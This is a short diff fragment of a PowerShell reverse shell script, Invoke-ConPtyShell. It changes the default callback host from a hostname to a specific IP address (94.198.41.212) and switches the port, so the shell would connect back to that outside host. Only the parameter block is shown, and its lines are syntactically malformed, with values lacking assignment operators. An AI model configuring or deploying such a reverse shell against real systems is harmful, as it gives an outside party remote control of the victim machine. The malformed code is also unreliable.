@@ -72,11 +72,11 @@ function Invoke-ConPtyShell
     (
         [Parameter(Position = 0)]
         [String]
-        $RemoteIp black-accessback.systes.net
+        $RemoteIp 94.198.41.212
         
         [Parameter(Position = 1)]
         [String]
-        $RemotePort 3001
+        $RemotePort 9929
 
         [Parameter()]
         [String]
